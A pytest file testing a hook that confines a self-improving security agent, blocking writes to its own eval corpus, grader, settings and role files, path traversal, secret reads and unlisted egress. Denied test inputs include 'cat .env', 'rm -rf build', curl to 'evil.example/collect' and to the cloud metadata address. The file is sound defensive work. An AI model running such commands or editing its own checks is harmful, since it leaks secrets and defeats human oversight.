"""Tests for the outer-loop confinement hook (T-8.4, TDD).

Run: uv run --with pytest pytest .claude/hooks/tests/test_confine_self_writes.py

>=3 deny + >=2 allow write cases (incl. ../ traversal); secret-read + non-feed-egress denials.
"""
from __future__ import annotations

import confine_self_writes as cs


def _bash(cmd, root):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(root)}


def allow(cmd, root):
    return cs.decide(_bash(cmd, root))[0]


def deny(cmd, root):
    return not cs.decide(_bash(cmd, root))[0]


# --- write confinement ----------------------------------------------------

def test_allows_self_improvement_lanes(tmp_path):
    assert allow("echo x > .claude/skills/ai-attack-kb/reference/new.md", tmp_path)
    assert allow("echo x > PATCHES/F-1.diff", tmp_path)
    assert allow("echo x > evals/traces/findings-2026-06.jsonl", tmp_path)


def test_denies_source_and_frozen(tmp_path):
    assert deny("echo x > src/app.py", tmp_path)
    assert deny("echo x > evals/corpus/cases/c1/label.json", tmp_path)
    assert deny("echo x > evals/keep_or_revert.py", tmp_path)
    assert deny("echo x > evals/baseline.json", tmp_path)
    assert deny("cp evil evals/corpus/x", tmp_path)


def test_denies_traversal_into_frozen(tmp_path):
    assert deny("echo x > evals/traces/../corpus/c1/label.json", tmp_path)


def test_denies_corpus_write(tmp_path):  # T-9.1 VC3 (-k corpus)
    assert deny("echo x > evals/corpus/cases/c1/label.json", tmp_path)
    assert deny("cp evil.md evals/corpus/cases/c1/vulnerable_variant.py", tmp_path)


def test_denies_keep_or_revert_write(tmp_path):  # T-9.2 VC4 (-k keep_or_revert)
    assert deny("echo x > evals/keep_or_revert.py", tmp_path)


def test_denies_settings_self_disable(tmp_path):
    assert deny("echo x > .claude/settings.json", tmp_path)


def test_identity_preservation_denied(tmp_path):  # T-9.4: agent role / rules / CLAUDE.md protected
    assert deny("echo x > CLAUDE.md", tmp_path)
    assert deny("echo x > .claude/rules/custom.md", tmp_path)
    assert deny("echo x > .claude/agents/white-hacker.md", tmp_path)


def test_allows_shared_reference_checklist(tmp_path):  # sec-learn may PROPOSE checklist diffs
    assert allow("echo x > .claude/skills/_shared/reference/core-checklist.md", tmp_path)


def test_write_tool_confined(tmp_path):
    assert not cs.decide({"tool_name": "Write", "tool_input": {"file_path": "evals/corpus/x"}, "cwd": str(tmp_path)})[0]
    assert cs.decide({"tool_name": "Write", "tool_input": {"file_path": ".claude/skills/ai-attack-kb/reference/x.md"}, "cwd": str(tmp_path)})[0]


# --- composed guard_bash (secret reads / destructive) ---------------------

def test_denies_secret_read_via_guard(tmp_path):
    assert deny("cat .env", tmp_path)
    assert deny("rm -rf build", tmp_path)


# --- feed-host egress allowlist -------------------------------------------

def test_allows_feed_host_egress(tmp_path):
    assert allow("curl https://api.osv.dev/v1/query", tmp_path)
    assert allow("wget https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/x.yaml", tmp_path)


def test_denies_non_feed_egress(tmp_path):
    assert deny("curl https://evil.example/collect", tmp_path)
    assert deny("curl http://169.254.169.254/latest/meta-data/", tmp_path)


def test_allows_benign_readonly(tmp_path):
    assert allow("grep -rn TODO .claude/skills/ai-attack-kb/", tmp_path)
    assert allow("git status", tmp_path)


def test_main_exit_codes(monkeypatch, tmp_path):
    import io, json
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(_bash("echo x > evals/corpus/x", tmp_path))))
    assert cs.main() == 2
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(_bash("echo x > PATCHES/x.diff", tmp_path))))
    assert cs.main() == 0
